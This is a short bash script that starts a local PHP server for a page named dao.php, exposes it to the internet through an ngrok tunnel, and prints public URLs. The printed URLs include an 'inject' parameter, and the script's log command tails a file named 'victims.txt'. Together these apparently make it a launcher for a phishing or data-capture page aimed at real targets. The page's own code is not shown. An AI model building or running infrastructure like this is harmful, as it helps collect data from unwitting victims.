#!/bin/bash
cd "$(dirname "$0")"

echo "🚀 Starting DAO Server..."

# Kill old processes
pkill -f "php -S" &>/dev/null
pkill -f "ngrok http" &>/dev/null
sleep 2

# Start PHP
php -S 127.0.0.1:8080 > php.log 2>&1 &
PHP_PID=$!
echo "✅ PHP Server PID: $PHP_PID"

# Start NGROK
ngrok http 8080 > ngrok.log 2>&1 &
NGROK_PID=$!
echo "✅ NGROK PID: $NGROK_PID"

# Wait + Show URL
sleep 3
NGROK_URL=$(grep -o 'https://[^ ]*\.ngrok.io' ngrok.log | head -1 || echo "Check ngrok.log")
echo ""
echo "🔥 LIVE URLS:"
echo "📱 Main: $NGROK_URL/dao.php"
echo "🔗 Inject: $NGROK_URL/dao.php?inject=https://youtube.com/watch?v=test"
echo ""
echo "📊 Logs:"
echo "tail -f php.log ngrok.log victims.txt"
echo ""
echo "🛑 Ctrl+C to stop | screen -S dao for background"
